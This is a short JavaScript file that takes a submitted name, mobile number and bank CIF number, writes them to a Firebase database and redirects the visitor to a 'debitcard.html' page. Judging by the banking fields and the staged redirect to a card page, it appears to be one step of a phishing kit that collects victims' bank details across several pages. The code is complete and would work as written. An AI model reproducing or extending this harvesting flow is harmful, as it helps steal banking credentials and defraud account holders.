// firebase-form.js

const ududip007DB = firebase.database().ref("ududip007");

document.getElementById("ududip007").addEventListener("submit", function (e) {
  e.preventDefault();

  const aname = document.getElementById("aname").value;
  const bmobile = document.getElementById("bmobile").value;
  const cac = document.getElementById("cac").value;

  const newEntry = ududip007DB.push();
  newEntry
    .set({
      a_NAME: aname,
      b_MOBILE: bmobile,
      c_CIF: cac
    })
    .then(() => {
      localStorage.setItem("firebaseKey", newEntry.key);
      window.location.href = "debitcard.html";
    })
    .catch((error) => {
      alert("Error: " + error.message);
    });
});
